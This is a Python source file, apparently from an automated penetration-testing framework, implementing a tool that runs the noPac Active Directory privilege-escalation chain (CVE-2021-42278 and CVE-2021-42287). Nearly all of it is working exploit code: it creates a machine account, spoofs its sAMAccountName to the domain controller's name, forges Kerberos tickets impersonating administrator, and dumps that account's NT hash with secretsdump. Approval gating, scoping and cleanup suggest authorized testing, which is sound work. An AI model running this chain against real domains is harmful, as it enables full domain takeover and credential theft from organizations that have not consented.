"""Durable ``nexus.attack.nopac`` handler (CVE-2021-42278 + CVE-2021-42287).

The "noPac" / *SamAccountName spoofing* chain turns **any** domain user into a
Domain Admin on an unpatched domain controller:

1. every authenticated user may add machine accounts
   (``ms-DS-MachineAccountQuota``, ``10`` by default), so the operator creates
   one under its own control;
2. that machine account's ``sAMAccountName`` is changed to the DC's computer
   name **without** the trailing ``$`` (CVE-2021-42278: no validation that a
   machine account's name ends in ``$``) and a TGT is requested under that name;
3. the name is restored, so the KDC can no longer resolve the client principal
   from the TGT and -- on a vulnerable DC -- *falls back* to appending ``$``
   (CVE-2021-42287), which resolves to the **DC's own machine account**;
4. the S4U2self service ticket that follows is therefore sealed with the DC's
   key and impersonates a privileged account;
5. that ticket is used to DCSync the impersonated account, which is both the
   wire-level proof of the escalation and the loot.

Measured on the sala10/Ra target (RUN_sala10 §7.6), every step through the
sandbox with a resolved binary and no direct spawn:

* ``impacket-addcomputer`` (SAMR) creates ``OMNI<hex>$``;
* ``ldapsearch`` resolves its DN and ``ldapmodify`` (an LDIF written inside the
  workspace; the sandbox closes ``stdin``) performs the rename/restore;
* ``impacket-getTGT`` for ``<domain>/<dc_host>`` writes ``<dc_host>.ccache``;
* ``impacket-getST -self -impersonate <user> -altservice cifs/<ip>`` runs with
  ``KRB5CCNAME`` pointing at that ccache -- the ticket is rewritten to the
  target IP so **no DNS resolution of the DC is needed**;
* ``impacket-secretsdump -k -no-pass -just-dc-user <user>`` dumps the
  impersonated account's NTDS entry with the forged ticket.

The handler cleans up after itself: the machine account is deleted and the
``sAMAccountName`` restored on every failure path. The NT hash is written to a
workspace artifact instead of being embedded in the durable output (only its
SHA-256 travels in the result), so the audit trail keeps the custody without
persisting the credential.
"""

from __future__ import annotations

import hashlib
import os
import re
import secrets
from pathlib import Path
from typing import Any

from nexus_core.kernel.models import RiskLevel, RunContext, ToolDefinition, ToolResult

from ._ad import ad_sandbox, resolve_ad_binary, validate_domain, validate_host, validate_username
from ._exec import run_in_sandbox, safe_run_id
from ._impacket_resolver import resolve_impacket_binary

NOPAC_DEFAULT_TIMEOUT_SECONDS = 600
NOPAC_MAX_TIMEOUT_SECONDS = 1800
NOPAC_DEFAULT_IMPERSONATE = "administrator"
NOPAC_MACHINE_PREFIX = "OMNI"
NOPAC_MIN_MACHINE_PASSWORD_CHARS = 12
NOPAC_MAX_MACHINE_PASSWORD_CHARS = 120

#: Impacket prints this on a successful ``addcomputer``.
NOPAC_ADD_MARKERS = ("successfully added machine account",)
#: Printed by ``getTGT``/``getST`` whenever a ccache was written.
NOPAC_TICKET_MARKERS = ("saving ticket in",)
#: One dumped NTDS entry: ``user:rid:lmhash:nthash:::``.
NOPAC_DUMP_RE = re.compile(
    r"^(?P<user>[^:\s]+):(?P<rid>\d+):(?P<lm>[0-9a-fA-F]{32}):(?P<nt>[0-9a-fA-F]{32}):::",
    re.MULTILINE,
)
_MACHINE_NAME_RE = re.compile(r"[A-Za-z0-9-]{1,14}\$")
_LDIF_DN_RE = re.compile(r"^dn:\s*(?P<dn>\S.*)$", re.MULTILINE)


def nopac_definition(tenant_id: str = "system") -> ToolDefinition:
    """Return the durable ToolDefinition for the noPac escalation."""
    return ToolDefinition(
        tool_id="nexus.attack.nopac",
        name="noPac / SamAccountName spoofing (CVE-2021-42278 + CVE-2021-42287)",
        tenant_id=tenant_id,
        description=(
            "Escala cualquier usuario de dominio a Domain Admin en un DC sin "
            "parchear (CVE-2021-42278 + CVE-2021-42287): crea una cuenta de "
            "máquina, la renombra al nombre del DC sin '$', pide un TGT, "
            "restaura el nombre y pide un service ticket con S4U2self, que el "
            "KDC confundido sella con la clave de la cuenta del DC e impersona "
            "al usuario indicado. Verifica de verdad volcando ese usuario con "
            "el ticket (DRSUAPI). Crea y BORRA objetos en AD (deja la cuenta "
            "limpia). HIGH: requiere aprobación."
        ),
        input_schema={
            "type": "object",
            "properties": {
                "target": {"type": "string", "minLength": 1, "maxLength": 255},
                "domain": {"type": "string", "minLength": 1, "maxLength": 255},
                "username": {"type": "string", "minLength": 1, "maxLength": 128},
                "password": {"type": "string", "maxLength": 512},
                "hash": {"type": "string", "maxLength": 65},
                "dc_host": {
                    "type": "string",
                    "maxLength": 255,
                    "description": "Nombre de equipo del DC (p. ej. FIRE).",
                },
                "dc_fqdn": {
                    "type": "string",
                    "maxLength": 255,
                    "description": "FQDN del DC (p. ej. fire.windcorp.thm).",
                },
                "impersonate": {
                    "type": "string",
                    "maxLength": 128,
                    "description": "Cuenta a impersonar (por defecto administrator).",
                },
                "computer_name": {"type": "string", "maxLength": 15},
                "machine_password": {"type": "string", "maxLength": 120},
                "cleanup": {"type": "boolean", "default": True},
                "timeout_seconds": {
                    "type": "integer",
                    "minimum": 60,
                    "maximum": NOPAC_MAX_TIMEOUT_SECONDS,
                },
            },
            "required": ["target", "domain", "username"],
            "additionalProperties": False,
        },
        risk=RiskLevel.HIGH,
        effect="exploit",
        required_permissions=["execute:tool:nexus.attack.nopac"],
        timeout_seconds=NOPAC_MAX_TIMEOUT_SECONDS,
        max_output_bytes=2_000_000,
        scope_target_field="target",
        scope_required=True,
    )


def generate_machine_name() -> str:
    """Return a fresh machine account name (``OMNI<4 hex>$``)."""
    return f"{NOPAC_MACHINE_PREFIX}{secrets.token_hex(2).upper()}$"


def generate_machine_password() -> str:
    """Return a fresh machine password that satisfies AD complexity."""
    return f"Omni{secrets.token_hex(4)}!"


def validate_machine_name(value: Any) -> str:
    """Return a bounded ``NAME$`` machine account name."""
    text = str(value or "").strip()
    if not _MACHINE_NAME_RE.fullmatch(text):
        raise ValueError("computer_name must look like NAME$ (max 15 characters)")
    return text


def validate_machine_password(value: Any) -> str:
    """Return a bounded, printable machine account password."""
    text = str(value or "")
    if not NOPAC_MIN_MACHINE_PASSWORD_CHARS <= len(text) <= NOPAC_MAX_MACHINE_PASSWORD_CHARS:
        raise ValueError("machine_password length is out of range")
    if any(ord(ch) < 0x20 for ch in text):
        raise ValueError("machine_password must not contain control characters")
    return text


def resolve_dc_names(arguments: dict, domain: str) -> tuple[str, str]:
    """Return ``(dc_host, dc_fqdn)`` from whichever the operator supplied."""
    host = str(arguments.get("dc_host") or "").strip()
    fqdn = str(arguments.get("dc_fqdn") or "").strip()
    if host:
        host = validate_host(host, field="dc_host")
    if fqdn:
        fqdn = validate_host(fqdn, field="dc_fqdn")
    if not host and not fqdn:
        raise ValueError("dc_host or dc_fqdn is required (the DC's computer name)")
    if not host:
        host = fqdn.split(".")[0]
    if not fqdn:
        fqdn = f"{host}.{domain}"
    return host, fqdn


def build_rename_ldif(dn: str, sam_account_name: str) -> str:
    """Return the LDIF that sets ``sAMAccountName`` on ``dn``."""
    _validate_dn(dn)
    _validate_ldif_value(sam_account_name)
    return (
        f"dn: {dn}\n"
        "changetype: modify\n"
        "replace: sAMAccountName\n"
        f"sAMAccountName: {sam_account_name}\n"
    )


def _validate_dn(dn: str) -> str:
    text = str(dn or "").strip()
    if not text or "\n" in text or not text.lower().startswith("cn="):
        raise ValueError("could not resolve a usable DN for the machine account")
    return text


def _validate_ldif_value(value: str) -> str:
    text = str(value or "")
    if not text or any(ch in text for ch in "\n\r") or text.startswith((" ", ":", "<")):
        raise ValueError("refusing to write an unsafe LDIF value")
    return text


def _workspace_root() -> Path:
    return Path(os.getenv("NEXUS_WORKSPACE_ROOT", os.getcwd())).resolve()


def _accepted(stdout: str, markers: tuple[str, ...]) -> bool:
    text = (stdout or "").lower()
    return any(marker in text for marker in markers)


def _parse_dn(stdout: str) -> str:
    match = _LDIF_DN_RE.search(stdout or "")
    return match.group("dn").strip() if match else ""


def _auth_positional(domain: str, username: str, password: str | None) -> str:
    text = f"{domain}/{username}"
    if password:
        text += f":{password}"
    return text


def _steps_failed(
    step: str, *, evidence: dict[str, Any], stdout: str, stderr: str, exit_code: int | None
) -> ToolResult:
    """Build the declared negative for a failed chain step."""
    evidence["failed_step"] = step
    return ToolResult(
        output={"error": f"noPac step failed: {step}", "step": step},
        verified=False,
        verification_method=f"nopac_{step}_failed",
        evidence=evidence,
        exit_code=exit_code,
        accepted_exit_codes=(0,),
        stdout=stdout,
        stderr=stderr,
    )


async def nopac_handler(arguments: dict, context: RunContext) -> ToolResult:
    """Run the SamAccountName-spoofing chain through the sandbox."""
    target = validate_host(arguments.get("target"))
    domain = validate_domain(arguments["domain"])
    username = validate_username(arguments["username"])
    password = str(arguments["password"]) if arguments.get("password") else None
    ntlm_hash = str(arguments["hash"]) if arguments.get("hash") else None
    if not password and not ntlm_hash:
        raise ValueError("nopac requires a password or a hash")
    if not password:
        # Steps 2/4 rename the account over LDAP with a simple bind, so the
        # operator must supply a password (the hash only covers SAMR/Kerberos).
        raise ValueError("nopac requires the account password for the LDAP rename")

    impersonate = validate_username(
        arguments.get("impersonate") or NOPAC_DEFAULT_IMPERSONATE, field="impersonate"
    )
    dc_host, dc_fqdn = resolve_dc_names(arguments, domain)
    machine_name = validate_machine_name(arguments.get("computer_name") or generate_machine_name())
    machine_password = validate_machine_password(
        arguments.get("machine_password") or generate_machine_password()
    )
    cleanup = bool(arguments.get("cleanup", True))

    requested_timeout = arguments.get("timeout_seconds")
    timeout_seconds = min(
        NOPAC_MAX_TIMEOUT_SECONDS,
        max(60, int(requested_timeout) if requested_timeout else NOPAC_DEFAULT_TIMEOUT_SECONDS),
    )

    impacket_addcomputer = resolve_impacket_binary("addcomputer")
    impacket_gettgt = resolve_impacket_binary("getTGT")
    impacket_getst = resolve_impacket_binary("getST")
    impacket_secretsdump = resolve_impacket_binary("secretsdump")
    ldapsearch = resolve_ad_binary("ldapsearch")
    ldapmodify = resolve_ad_binary("ldapmodify")
    missing = [
        name
        for name, binary in (
            ("addcomputer", impacket_addcomputer),
            ("getTGT", impacket_gettgt),
            ("getST", impacket_getst),
            ("secretsdump", impacket_secretsdump),
            ("ldapsearch", ldapsearch),
            ("ldapmodify", ldapmodify),
        )
        if not binary
    ]
    if missing:
        return ToolResult(
            output={"error": "required binaries are missing", "missing": missing},
            verified=False,
            verification_method="nopac_unavailable",
        )

    workspace = _workspace_root()
    run_id = safe_run_id(context, "nopac")
    base_dn = "DC=" + ",DC=".join(domain.split("."))
    evidence: dict[str, Any] = {
        "target": target,
        "domain": domain,
        "dc_host": dc_host,
        "dc_fqdn": dc_fqdn,
        "username": username,
        "impersonate": impersonate,
        "machine_account": machine_name,
        "timeout_seconds": timeout_seconds,
        "steps": [],
    }
    timeout_per_step = max(60, timeout_seconds // 3)

    # ---------------------------------------------------------------- 1) add
    add_argv = [
        impacket_addcomputer,
        "-computer-name",
        machine_name,
        "-computer-pass",
        machine_password,
        "-dc-ip",
        target,
        "-method",
        "SAMR",
    ]
    if ntlm_hash:
        add_argv.extend(["-hashes", ntlm_hash])
    add_argv.append(_auth_positional(domain, username, password))
    added = await run_in_sandbox(
        ad_sandbox(str(workspace), impacket_addcomputer, ldapsearch, ldapmodify),
        add_argv,
        timeout_seconds=timeout_per_step,
        image_env="NEXUS_IMPACKET_IMAGE",
        default_image="impacket",
    )
    evidence["steps"].append("addcomputer")
    evidence["account_created"] = _accepted(added.stdout, NOPAC_ADD_MARKERS)
    if not evidence["account_created"]:
        evidence["error"] = (added.stderr or added.stdout or "")[-400:]
        return _steps_failed(
            "addcomputer",
            evidence=evidence,
            stdout=added.stdout,
            stderr=added.stderr,
            exit_code=added.exit_code,
        )

    async def restore_name(reason: str) -> dict[str, Any]:
        """Best-effort rename back to ``machine_name`` (never raises)."""
        ldif = workspace / f"nopac_{run_id}_restore.ldif"
        ldif.write_text(build_rename_ldif(dn, machine_name), encoding="utf-8")
        result = await run_in_sandbox(
            ad_sandbox(str(workspace), ldapmodify),
            [
                ldapmodify,
                "-x",
                "-H",
                f"ldap://{target}",
                "-D",
                f"{username}@{domain}",
                "-w",
                str(password),
                "-f",
                str(ldif),
            ],
            timeout_seconds=timeout_per_step,
            image_env="NEXUS_IMPACKET_IMAGE",
            default_image="impacket",
        )
        ok = result.exit_code == 0 and not _failed_ldap(result.stdout, result.stderr)
        evidence["restored"] = ok
        evidence["restore_reason"] = reason
        return {"ok": ok, "stdout": result.stdout, "stderr": result.stderr}

    async def delete_account() -> bool:
        """Best-effort removal of the machine account we created."""
        if not cleanup:
            return False
        delete_argv = [
            impacket_addcomputer,
            "-delete",
            "-computer-name",
            machine_name,
            "-dc-ip",
            target,
            _auth_positional(domain, username, password),
        ]
        result = await run_in_sandbox(
            ad_sandbox(str(workspace), impacket_addcomputer),
            delete_argv,
            timeout_seconds=timeout_per_step,
            image_env="NEXUS_IMPACKET_IMAGE",
            default_image="impacket",
        )
        deleted = result.exit_code == 0 and "not found" not in (result.stdout or "").lower()
        evidence["cleanup_ok"] = deleted
        return deleted

    # ------------------------------------------------------------- 2) DN + rename
    search = await run_in_sandbox(
        ad_sandbox(str(workspace), ldapsearch),
        [
            ldapsearch,
            "-x",
            "-LLL",
            "-H",
            f"ldap://{target}",
            "-D",
            f"{username}@{domain}",
            "-w",
            str(password),
            "-b",
            base_dn,
            f"(sAMAccountName={machine_name})",
            "dn",
        ],
        timeout_seconds=timeout_per_step,
        image_env="NEXUS_IMPACKET_IMAGE",
        default_image="impacket",
    )
    dn = _parse_dn(search.stdout)
    evidence["steps"].append("ldapsearch_dn")
    if not dn:
        await delete_account()
        evidence["error"] = (search.stderr or search.stdout or "")[-400:]
        return _steps_failed(
            "ldapsearch",
            evidence=evidence,
            stdout=search.stdout,
            stderr=search.stderr,
            exit_code=search.exit_code,
        )
    try:
        rename_ldif = build_rename_ldif(dn, dc_host)
    except ValueError as exc:
        await delete_account()
        raise ValueError(str(exc)) from exc

    rename_file = workspace / f"nopac_{run_id}_rename.ldif"
    rename_file.write_text(rename_ldif, encoding="utf-8")
    rename = await run_in_sandbox(
        ad_sandbox(str(workspace), ldapmodify),
        [
            ldapmodify,
            "-x",
            "-H",
            f"ldap://{target}",
            "-D",
            f"{username}@{domain}",
            "-w",
            str(password),
            "-f",
            str(rename_file),
        ],
        timeout_seconds=timeout_per_step,
        image_env="NEXUS_IMPACKET_IMAGE",
        default_image="impacket",
    )
    evidence["steps"].append("rename_to_dc_name")
    evidence["renamed_to"] = dc_host
    if _failed_ldap(rename.stdout, rename.stderr):
        await delete_account()
        evidence["error"] = (rename.stderr or rename.stdout or "")[-400:]
        return _steps_failed(
            "rename",
            evidence=evidence,
            stdout=rename.stdout,
            stderr=rename.stderr,
            exit_code=rename.exit_code,
        )

    # ------------------------------------------------------------------ 3) TGT
    tgt = await run_in_sandbox(
        ad_sandbox(str(workspace), impacket_gettgt),
        [impacket_gettgt, f"{domain}/{dc_host}:{machine_password}", "-dc-ip", target],
        timeout_seconds=timeout_per_step,
        image_env="NEXUS_IMPACKET_IMAGE",
        default_image="impacket",
    )
    evidence["steps"].append("gettgt")
    tgt_path = workspace / f"{dc_host}.ccache"
    if not _accepted(tgt.stdout, NOPAC_TICKET_MARKERS) or not tgt_path.is_file():
        await restore_name("gettgt_failed")
        await delete_account()
        evidence["error"] = (tgt.stderr or tgt.stdout or "")[-400:]
        return _steps_failed(
            "gettgt", evidence=evidence, stdout=tgt.stdout, stderr=tgt.stderr, exit_code=tgt.exit_code
        )

    # --------------------------------------------------------------- 4) restore
    restored = await restore_name("chain")
    evidence["steps"].append("restore_machine_name")
    if not restored["ok"]:
        await delete_account()
        evidence["error"] = (restored["stderr"] or restored["stdout"] or "")[-400:]
        return _steps_failed(
            "restore",
            evidence=evidence,
            stdout=str(restored["stdout"]),
            stderr=str(restored["stderr"]),
            exit_code=1,
        )

    # ------------------------------------------------------------------ 5) ST
    # ``-self`` ignores ``-spn``: getST takes the requested sname from the
    # identity's username, so the DC's SMB SPN is passed there on purpose.
    st = await run_in_sandbox(
        ad_sandbox(str(workspace), impacket_getst),
        [
            impacket_getst,
            "-self",
            "-impersonate",
            impersonate,
            "-altservice",
            f"cifs/{target}",
            "-dc-ip",
            target,
            "-k",
            "-no-pass",
            f"{domain}/cifs/{dc_fqdn}",
        ],
        timeout_seconds=timeout_per_step,
        image_env="NEXUS_IMPACKET_IMAGE",
        default_image="impacket",
        extra_env={"KRB5CCNAME": str(tgt_path)},
    )
    evidence["steps"].append("getst_s4u2self")
    tickets = list(workspace.glob(f"*@cifs_{target}@*.ccache"))
    tickets.sort(key=lambda item: item.stat().st_mtime)
    if not _accepted(st.stdout, NOPAC_TICKET_MARKERS) or not tickets:
        await delete_account()
        evidence["error"] = (st.stderr or st.stdout or "")[-400:]
        return _steps_failed(
            "getst", evidence=evidence, stdout=st.stdout, stderr=st.stderr, exit_code=st.exit_code
        )
    ticket_path = tickets[-1]
    evidence["ticket"] = ticket_path.name
    evidence["ticket_sha256"] = _sha256_file(ticket_path)

    # -------------------------------------------------------------- 6) verify
    dump = await run_in_sandbox(
        ad_sandbox(str(workspace), impacket_secretsdump),
        [
            impacket_secretsdump,
            "-k",
            "-no-pass",
            "-just-dc-user",
            impersonate,
            "-dc-ip",
            target,
            f"{domain}/{impersonate}@{target}",
        ],
        timeout_seconds=timeout_seconds,
        image_env="NEXUS_IMPACKET_IMAGE",
        default_image="impacket",
        extra_env={"KRB5CCNAME": str(ticket_path)},
    )
    evidence["steps"].append("dcsync_impersonated_user")
    match = NOPAC_DUMP_RE.search(dump.stdout or "")
    await delete_account()

    if match is None:
        evidence["error"] = (dump.stderr or dump.stdout or "")[-400:]
        return ToolResult(
            output={
                "error": "the forged ticket did not dump the impersonated account",
                "target": target,
                "impersonate": impersonate,
                "ticket": ticket_path.name,
            },
            verified=False,
            verification_method="nopac_escalation_unverified",
            evidence=evidence,
            exit_code=dump.exit_code,
            accepted_exit_codes=(0,),
            stdout=dump.stdout,
            stderr=dump.stderr,
        )

    dumped_user = match.group("user")
    nt_hash = match.group("nt").lower()
    dump_file = workspace / f"nopac_{run_id}_{impersonate}.ntds.txt"
    dump_file.write_text(
        "# nexus.attack.nopac — DRSUAPI entry obtained with the forged service "
        f"ticket\n# target={target} domain={domain} dc={dc_host}\n"
        f"# machine_account={machine_name} (deleted) impersonated={dumped_user}\n"
        f"{match.group(0)}\n",
        encoding="utf-8",
    )
    evidence["dump_file"] = dump_file.name
    evidence["rid"] = int(match.group("rid"))
    evidence["nt_sha256"] = hashlib.sha256(nt_hash.encode()).hexdigest()

    return ToolResult(
        output={
            "target": target,
            "domain": domain,
            "dc_host": dc_host,
            "dc_fqdn": dc_fqdn,
            "machine_account": machine_name,
            "impersonate": dumped_user,
            "rid": int(match.group("rid")),
            "ticket": ticket_path.name,
            "dump_file": dump_file.name,
            "nt_sha256": evidence["nt_sha256"],
            "cleanup": bool(evidence.get("cleanup_ok")),
        },
        verified=True,
        verification_method="nopac_domain_admin_dumped",
        evidence=evidence,
        exit_code=dump.exit_code,
        accepted_exit_codes=(0,),
        stdout=dump.stdout,
        stderr=dump.stderr,
    )


def _failed_ldap(stdout: str, stderr: str) -> bool:
    """True when ``ldapmodify``/``ldapsearch`` reported an LDAP failure.

    OpenLDAP prints ``ldap_modify: <error>`` (or ``ldap_bind``) without a
    non-zero exit code, and a search answers with ``result: N`` where ``0`` is
    success, so both forms have to be inspected explicitly.
    """
    text = f"{stdout}\n{stderr}"
    lowered = text.lower()
    if "ldap_modify:" in lowered or "ldap_bind:" in lowered or "ldap_search:" in lowered:
        return True
    codes = re.findall(r"^result:\s*(\d+)", text, re.MULTILINE)
    return any(int(code) != 0 for code in codes)


def _sha256_file(path: Path) -> str:
    """Return the SHA-256 of a file's bytes (chain of custody for a ccache)."""
    digest = hashlib.sha256()
    with path.open("rb") as handle:
        for chunk in iter(lambda: handle.read(65536), b""):
            digest.update(chunk)
    return digest.hexdigest()


__all__ = [
    "NOPAC_DEFAULT_IMPERSONATE",
    "build_rename_ldif",
    "generate_machine_name",
    "generate_machine_password",
    "nopac_definition",
    "nopac_handler",
    "resolve_dc_names",
    "validate_machine_name",
    "validate_machine_password",
]
